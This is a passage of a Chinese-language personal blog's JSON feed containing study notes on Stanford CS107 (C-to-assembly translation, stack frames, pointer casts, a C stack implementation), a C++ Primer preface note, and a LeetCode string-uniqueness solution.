data-num=\"4\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    why <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">short</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>snink <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token operator\">*</span>why <span class=\"token operator\">=</span> <span class=\"token number\">50</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>foo <strong>首先</strong>为变量分配空间</p>\n<p>汇编代码如下所示：</p>\n<pre><code class=\"language-assembly\">SP = SP - 8;\n</code></pre>\n<p><img data-src=\"image-20231119175325503.png\" alt=\"image-20231119175325503\"></p>\n<p><strong>随后</strong>执行</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>why <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">short</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>snink <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>也就是认为一个 short 类型的地址 why 被赋为从图中圈圈的地方开始的地址。</p>\n<p><img data-src=\"image-20231119175641263.png\" alt=\"image-20231119175641263\"></p>\n<p>汇编代码：</p>\n<pre><code class=\"language-assembly\">R1 = SP + 6;\nM[SP] = R1;\n</code></pre>\n<p><strong>接着</strong>执行</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">*</span>why <span class=\"token operator\">=</span> <span class=\"token number\">50</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>汇编代码：</p>\n<pre><code class=\"language-assembly\">R1 = M[SP];\nM[R1] = .2 50;\n</code></pre>\n<p>现在 foo 函数中的内容执行完毕，现在函数应该退出并且以某种方式返回到 main 函数中，即执行下面的汇编代码。SP + 8 意思是将申请的局部空间释放掉，SP 回到申请局部变量空间前的位置。执行 RET 的时候，会让 saved PC 中的内容取出来，并读入 PC 中以便跳回到 main 函数中，并让 SP + 4。</p>\n<pre><code class=\"language-assembly\">SP = SP + 8;\nRET;\n</code></pre>\n<p>现在在 main 函数中，走到了汇编代码的这个位置。接着执行 RV = 0 即 <code>return 0；</code></p>\n<pre><code class=\"language-assembly\">CALL &lt;foo&gt;;\n--&gt; SP = SP + 8;\nRV = 0;\n</code></pre>\n<h2 id=\"举一个一般活动过程的例子\"><a class=\"markdownIt-Anchor\" href=\"#举一个一般活动过程的例子\">#</a> 举一个一般活动过程的例子</h2>\n<p>第一部分是函数的参数，被函数的调用者，比如 main 函数初始化并预留空间；第二部分是 saved PC；第三部分是 函数的局部变量，是被调用的函数自己初始化并预留的空间。</p>\n<p><img data-src=\"image-20231119183230396.png\" alt=\"image-20231119183230396\"></p>\n<p>为什么要这样呢？为什么不直接由 main 函数预留这些空间？或者由被调用函数预留这些空间？因为谁申请的空间谁就要负责为这些空间进行赋值。所以参数部分只能由调用者进行初始化，局部变量只能由被调用的函数进行初始化。</p>\n<h2 id=\"举一个更有意义的函数的例子\"><a class=\"markdownIt-Anchor\" href=\"#举一个更有意义的函数的例子\">#</a> 举一个更有意义的函数的例子</h2>\n<p>函数 factorial 如下所示</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">fa</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>n <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">return</span> n <span class=\"token operator\">*</span> <span class=\"token function\">fa</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>函数的汇编代码如下所示</p>\n<pre><code class=\"language-assembly\">R1 = M[SP + 4];\nBNE R1,0,PC+12;\t\t//如果n不为0则进行跳转，否则按顺序执行\nRV = 1;\t\t\t\t//return 1\nRET;\t\t\t\t//返回到被调用前的位置\nR1 = M[SP+4];\nR1 = R1 - 1;\t\t// 先得到 n - 1 的值\nSP = SP - 4;\t\t// \nM[SP] = R1;\t\t\t// 将n - 1 存放到空间中，作为下一个调用函数的参数\nCALL&lt;fa&gt;;\nSP = SP + 4;\t\t// 调用的函数返回后，释放掉参数的空间\nR1 = M[SP + 4];\nRV = RV * R1;\t    // return n * RV\nRET;\n</code></pre>\n<p>这段例子在这节课的  <code>42 分钟</code> 开始有一个幻灯片例子，很清晰。</p>\n",
            "tags": [
                "斯坦福编程范式CS107"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/11/19/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_9/",
            "url": "http://yanagi-kon.github.io/2023/11/19/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_9/",
            "title": "斯坦福编程范式CS107_9",
            "date_published": "2023-11-19T00:28:00.000Z",
            "content_html": "<h1 id=\"斯坦福编程范式cs107_9\"><a class=\"markdownIt-Anchor\" href=\"#斯坦福编程范式cs107_9\">#</a> 斯坦福编程范式 CS107_9</h1>\n<h2 id=\"c语言与汇编语言的对照\"><a class=\"markdownIt-Anchor\" href=\"#c语言与汇编语言的对照\">#</a> C 语言与汇编语言的对照</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span><span class=\"token number\">10</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span>i<span class=\"token operator\">+</span><span class=\"token number\">7</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>j<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>上述代码在汇编中的形式为：</p>\n<pre><code class=\"language-assembly\">M[R1+4] = 10;\t\t//store operation\nR2 = M[R1+4];\t\t//load operation\nR3 = R2 + 7;\t\t//ALU operation\nM[R1] = R3;\t\t\t//store operation\nR2 = M[R1];\nR2 = R2 + 1;\nM[R1] = R2;\n</code></pre>\n<p>大写的 M 代表整个 RAM，将整个 RAM 看作是一个非常大的字节数组，R1 存储的是基地址，4 是偏移量。意思是，从基地址开始的四个字节写入数据 10。R1 存储的是 j 的地址。</p>\n<p><img data-src=\"image-20231118153659076.png\" alt=\"image-20231118153659076\"></p>\n<p>有人可能会问，“为什么不直接使用 M [R1]++”。因为在汇编语言中不允许直接对地址中的值进行修够，必须先通过 load operation 将其装载到寄存器中，对寄存器进行操作，并再将结果写回内存，这会使汇编语言更加简单，指令简单则时钟频率更快。</p>\n<h3 id=\"下面举一个不是-4-字节变量的例子\"><a class=\"markdownIt-Anchor\" href=\"#下面举一个不是-4-字节变量的例子\">#</a> 下面举一个不是 4 字节变量的例子：</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">short</span> s1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">short</span> s2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>i <span class=\"token operator\">=</span> <span class=\"token number\">200</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>s1 <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span>\t</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>s2 <span class=\"token operator\">=</span> s1 <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"image-20231118154657047.png\" alt=\"image-20231118154657047\"></p>\n<pre><code class=\"language-assembly\">M[R1+4] = 200;\t\n</code></pre>\n<p>对于 s1 = i 如果不可以直接用一下汇编语言实现</p>\n<pre><code class=\"language-assembly\">M[R1+2] = M[R1+4]; //这样翻译是错误的，因为汇编语言中，load 和 store 不能同时进行\n</code></pre>\n<p>也不可以用以下方法，因为 short 类型只有 2 字节，当被赋值 R2 这 4 个字节时，4 字节数据会被传输给 s1，s1 将会是 0（因为 R2 的高二位字节为 0），而 i 会变成一个非常大的数（因为 i 的高二位字节被分别赋值为了 0 和 200）。</p>\n<pre><code class=\"language-assembly\">R2 = M[R1+4];\t\nM[R1+2] = R2;\n</code></pre>\n<p>需要修改为：</p>\n<pre><code class=\"language-assembly\">R2 = M[R1+4];\t\nM[R1+2] = .2 R2; //移动两个字节，而不是4个\n</code></pre>\n<p>对于 s2 = s1 + 1; 汇编语言为：</p>\n<pre><code class=\"language-assembly\">R2 = .2 M[R1+2];\nR3 = R2 + 1;\nM[R1] = .2 R3;\n</code></pre>\n<h3 id=\"for循环是如何翻译的\"><a class=\"markdownIt-Anchor\" href=\"#for循环是如何翻译的\">#</a> for 循环是如何翻译的</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> array<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">4</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    array<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>i<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>首先是内存的申请，假设现在已经申请好了空间，那么执行 for 循环，第一步就是 i = 0</p>\n<pre><code class=\"language-assembly\">M[R1] = 0;\n</code></pre>\n<p>下面进行判断关系 i &lt; 4。这里的 BGT 是分支指令 branch greater or equal 的缩写，意思就是如果第一个参数大于等于第二个参数就进行跳转到第三个参数的地址上，否则继续按顺序执行。</p>\n<pre><code class=\"language-assembly\">R2 = M[R1];\nBGE  R2,4,PC+? \t//这里暂时不知道从基地址偏移多少个4字节(汇编指令的大小)\nR3 = M[R1];\t\t//R3就是i\nR4 = R3 * 4;\t//乘4因为int占4字节，R4是相较于数组基地址偏移后的地址\nR5 = R1 + 4;\t//R5是数组的基地址\nR6 = R5 + R4\t//R6是本轮循环要操作的数组元素的地址\nM[R6] = 0;\t\t//array[i] = 0;\n</code></pre>\n<p>接着进行 i ++</p>\n<pre><code class=\"language-assembly\">R2 = M[R1];\nR2 = R2 + 1;\nM[R1] = R2;\n</code></pre>\n<p>接着执行分支指令，跳回判断语句，这里是无条件跳转，即 JMP</p>\n<pre><code class=\"language-assembly\">JMP PC-40;\n</code></pre>\n<p>下面该写循环执行完，跳出循环后的 i – 了，并且现在我们可以把循环中的？给替换了，可以知道偏移应该是 10 条指令的大小，也就是 40。所以 <code>?=40</code> 。</p>\n<pre><code class=\"language-assembly\">R2 = M[R1];\nR2 = R2 - 1;\nM[R1] = R2;\n</code></pre>\n<p>对于 32 位操作系统，汇编代码指令一共有 32 位，为了能够表示 59 中汇编指令，需要 6 位进行表示，就是前六位是操作码。硬件会在一个时钟周期的前一部分，查看前 6 位机器码是什么，然后再决定如何解释剩下的 26 位。当然，这是使用定长编码对汇编指令进行编码，也可以使用非定长的编码方式。</p>\n<h2 id=\"指针和强制类型转换\"><a class=\"markdownIt-Anchor\" href=\"#指针和强制类型转换\">#</a> 指针和强制类型转换</h2>\n<p>下面以一个结构体为例：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">fraction</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">int</span> num<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> denom<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">fraction</span> pi<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>pi<span class=\"token punctuation\">.</span>num <span class=\"token operator\">=</span> <span class=\"token number\">22</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>pi<span class=\"token punctuation\">.</span>denom <span class=\"token operator\">=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>对于结构体，其内存如下图所示</p>\n<p><img data-src=\"image-20231118165258248.png\" alt=\"image-20231118165258248\"></p>\n<p>对于上述代码的汇编语言为：</p>\n<pre><code class=\"language-assembly\">M[R1] = 22;\nM[R1+4] = 7;\n</code></pre>\n<p>如果再进行以下操作：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">fraction</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>pi<span class=\"token punctuation\">.</span>denom<span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> denom <span class=\"token operator\">=</span> <span class=\"token number\">451</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这句代码的意思就是：</p>\n<p><img data-src=\"image-20231118165751885.png\" alt=\"image-20231118165751885\"></p>\n<p>那么这里的汇编代码是什么样的？如下：</p>\n<pre><code class=\"language-assembly\">M[R1+8] = 451;\n</code></pre>\n<p>pi 的地址是 M [R1]，pi.denom 的地址是 M [R1+4]，对其进行强制类型转换不会改变它的地址，-&gt;denom 的地址是 M [R1+4+4]。</p>\n",
            "tags": [
                "斯坦福编程范式CS107"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/11/19/C++%20Primer%2011.06/",
            "url": "http://yanagi-kon.github.io/2023/11/19/C++%20Primer%2011.06/",
            "title": "C++ Primer 11.06",
            "date_published": "2023-11-19T00:28:00.000Z",
            "content_html": "<h1 id=\"c-primer-1106\"><a class=\"markdownIt-Anchor\" href=\"#c-primer-1106\">#</a> C++ Primer 11.06</h1>\n<h2 id=\"推荐序\"><a class=\"markdownIt-Anchor\" href=\"#推荐序\">#</a> 推荐序</h2>\n<p>书籍推荐 by 孟岩</p>\n<blockquote>\n<p>C++ 标准程序库</p>\n<p>Effctive C++</p>\n<p>C++ Concurrency in Action\t// 开发并发程序</p>\n<p>Linux 多线程服务端编程\t\t// 以服务端开发提升 C++ 开发水平</p>\n</blockquote>\n<h2 id=\"前言\"><a class=\"markdownIt-Anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>本书的第 Ⅰ 和 Ⅱ 部分都需要完全掌握。本书每一章都有一个总结或者术语表为结束，二者共同回顾了本章的大部分学习重点，必要将其作为个人备忘录，以便自查。</p>\n<p>本书提供的大量程序示例的源码可以通过该<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5pbmZvcm1pdC5jb20vdGl0bGUvMDMyMTcxNDExMw==\">网址</span>获得</p>\n",
            "tags": [
                "C++ Primer"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/11/06/%E7%AE%97%E6%B3%9511.6/",
            "url": "http://yanagi-kon.github.io/2023/11/06/%E7%AE%97%E6%B3%9511.6/",
            "title": "算法11.06",
            "date_published": "2023-11-06T12:28:00.000Z",
            "content_html": "<h1 id=\"算法1106\"><a class=\"markdownIt-Anchor\" href=\"#算法1106\">#</a> 算法 11.06</h1>\n<h2 id=\"面试题-0101-判定字符是否唯一\"><a class=\"markdownIt-Anchor\" href=\"#面试题-0101-判定字符是否唯一\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9pcy11bmlxdWUtbGNjaS8=\">面试题 01.01. 判定字符是否唯一</span></h2>\n<p>实现一个算法，确定一个字符串  <code>s</code>  的所有字符是否全都不同。</p>\n<p><strong>示例 1：</strong></p>\n<pre><code>输入: s = &quot;leetcode&quot;\n输出: false \n</code></pre>\n<p><strong>示例 2：</strong></p>\n<pre><code>输入: s = &quot;abc&quot;\n输出: true\n</code></pre>\n<p><strong>限制：</strong></p>\n<ul>\n<li><code>0 &lt;= len(s) &lt;= 100 </code></li>\n<li><code>s[i]</code>  仅包含小写字母</li>\n<li>如果你不使用额外的数据结构，会很加分。</li>\n</ul>\n<p>方法一：</p>\n<blockquote>\n<p>通过 &amp; 操作，我们可以去判断某个状态我们是否做过标记 例：x &amp; (1 &lt;&lt; 0) 判断第一个状态是否已经做过标记，若做过标记，说明状态重复，返回 false</p>\n<p>通过 | 操作，我们可以去给某个状态做标记 例：x | (1 &lt;&lt; 0) 给第一个状态做标记</p>\n<p>通过 ^ 操作，则是将已经标记过的状态消去标记</p>\n</blockquote>\n<pre><code class=\"language-c++\">#include &lt;iostream&gt;\n#include &lt;cstring&gt;\nusing namespace std;\n\nclass Solution &#123;\npublic:\n    bool isUnique(string astr) &#123;\n        int x = 0;\n        for(int i = 0; i &lt; astr.size(); i++) &#123;\n            if(x &amp; (1 &lt;&lt; (astr[i] - 'a'))) return false;\n            else x |= (1 &lt;&lt; (astr[i] - 'a'));\n        &#125;\n        return true;\n    &#125;\n&#125;;\n\n/// astr = bab\nmark = 0;\nindex = 1;\nmark &amp; 1*2*index = mark &amp; 2 = 00 &amp; 10 = 0;\nmark = mark | 1*2*index = mark | 2 = 00 | 10 = 10 = 2;\n\nindex = 0;\nmark &amp; 1 = 2 &amp; 1 = 10 &amp; 01 = 0;\nmark = mark | 1 = 3;\n\nindex = 1;\nmark &amp; 2 = 11 &amp; 10 = 10 = 2  !=  0;\nreturn false;\n</code></pre>\n<p>方法二：</p>\n<pre><code class=\"language-c++\">class Solution &#123;\npublic:\n    bool isUnique(string astr) &#123;\n        for(int i=0; i&lt;astr.size();i++)&#123;\n            if(astr.find(astr[i])!=astr.rfind(astr[i]))&#123;\n                return false;\n            &#125;\n        &#125;\n        return true;\n    &#125;\n&#125;;\n</code></pre>\n<p>方法三：</p>\n<pre><code class=\"language-c++\">class Solution &#123;\npublic:\n    bool isUnique(char* astr)&#123;\n        bool array[26] = &#123;&#125;;\n        for(char *ch = astr; *ch != NULL; ch++ )\n        &#123;\n            int temp = *ch - 'a';\n            if(array[temp])\n            &#123;\n                return false;\n            &#125;\n            array[temp] = true;\n        &#125;\n        return true;\n    &#125;\n&#125;\n</code></pre>\n",
            "tags": [
                "C++_Leetcode"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/11/06/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_6/",
            "url": "http://yanagi-kon.github.io/2023/11/06/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_6/",
            "title": "斯坦福编程范式CS107_6",
            "date_published": "2023-11-06T00:28:00.000Z",
            "content_html": "<h1 id=\"斯坦福编程范式cs107_6\"><a class=\"markdownIt-Anchor\" href=\"#斯坦福编程范式cs107_6\">#</a> 斯坦福编程范式 CS107_6</h1>\n<h2 id=\"实现一个整型的栈下\"><a class=\"markdownIt-Anchor\" href=\"#实现一个整型的栈下\">#</a> 实现一个整型的栈（下）</h2>\n<p>在 C 语言中结构体中的所有内容都是隐式的 public ，无法像 C++ 那样，实现 private protect 之类的限定词进行限制，但是我们可以假装里面的内容是不可见的，并要求通过我们定义的函数对其中的内容进行操作。</p>\n<p>下面内容在  <code>stack.h</code>  文件中</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>elems<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> logicalLen<span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">// 已经使用的内存</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">int</span> alloclength<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 申请的内存大小</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span>stack<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackNew</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackDispose</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackPush</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">StackPop</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>上节课实现的 New 以及我们接下来要实现的其他函数，他们都在  <code>stack.c</code>  文件中</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackNew</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">&amp;</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    s<span class=\"token operator\">-></span>logicallen <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    s<span class=\"token operator\">-></span>allocLen <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    s<span class=\"token operator\">-></span>elems <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token operator\">*</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 动态分配内存函数，返回这一大块内存地址的开始地址</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">-></span>elems <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 如果 assert 里面的内容为 false，assert 会终止程序，并告知终止位置</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>下面是 Dispose 的实现</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackDispose</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">-></span>elems<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>有人可能会问，能否直接使用  <code>free(s)</code>  实现直接对栈进行释放内存？答案是不可以，因为除了在 New 函数中，其他任何地方对这个栈变量分配空间。 <code>free(s)</code>  这样操作的假设是 s 栈空间已经被分配好，并将它被 New 函数所指定的地址作为参数传递给 Dispose。</p>\n<p>下面是 Push 的实现</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">StackPush</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">-></span>logicalLen <span class=\"token operator\">==</span> s<span class=\"token operator\">-></span>alloclength<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        s<span class=\"token operator\">-></span>alloclength <span class=\"token operator\">*=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        s<span class=\"token operator\">-></span>elems <span class=\"token operator\">=</span> <span class=\"token function\">realloc</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">-></span>elems<span class=\"token punctuation\">,</span>s<span class=\"token operator\">-></span>alloclength <span class=\"token operator\">*</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token comment\">//realloc 首先假设第一个参数指向了一个动态申请的内存块，随后将其调整成第二个参数大小，如果可以调整，则返回第一个\t\t// 参数原先的地址，否则就使用 alloc 另开一块地址，返回新的地址</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>s<span class=\"token operator\">-></span>elems <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    s<span class=\"token operator\">-></span>elems<span class=\"token punctuation\">[</span>s<span class=\"token operator\">-></span>logicalLen<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>valus<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    s<span class=\"token operator\">-></span>logicalLen <span class=\"token operator\">++</span> <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>下面是 Pop 的实现</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">StackPop</span><span class=\"token punctuation\">(</span>stack <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token function\">assert</span><span 